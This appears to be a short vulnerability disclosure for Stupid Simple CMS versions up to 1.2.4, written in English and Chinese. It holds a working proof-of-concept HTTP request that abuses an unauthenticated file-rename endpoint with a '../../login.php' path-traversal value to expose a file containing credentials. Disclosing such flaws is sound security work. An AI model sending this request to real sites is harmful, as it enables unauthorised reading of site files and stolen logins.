product： Stupid Simple CMS ( Blogger )

download link： https://github.com/codelyfe/Stupid-Simple-CMS

version：<=1.2.4

POC:
```shell
POST http://localhost/file-manager/rename.php HTTP/1.1
Host: localhost
Content-Length: 36
sec-ch-ua: "Chromium";v="91", " Not;A Brand";v="99"
Accept: */*
X-Requested-With: XMLHttpRequest
sec-ch-ua-mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.101 Safari/537.36
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Origin: http://localhost
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: http://localhost/file-manager/
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close

oldName=../../login.php&newName=1.txt
```
The code audit found that the file renaming interface has no authentication measures, which can cause arbitrary file reading.
代码审计发现文件重命名接口无鉴权措施，可导致任意文件读取
![](https://cdn.jsdelivr.net/gh/g1an123/blogimage@main/202312171633421.png)
![](https://cdn.jsdelivr.net/gh/g1an123/blogimage@main/202312151700038.png)
The user name and password are included in the login.php as a sample demonstration
login.php中含有用户名和密码，作为样例演示
![](https://cdn.jsdelivr.net/gh/g1an123/blogimage@main/202312151705967.png)
![](https://cdn.jsdelivr.net/gh/g1an123/blogimage@main/202312151705967.png)
Local test read successfully.
![](https://cdn.jsdelivr.net/gh/g1an123/blogimage@main/202312151706716.png)
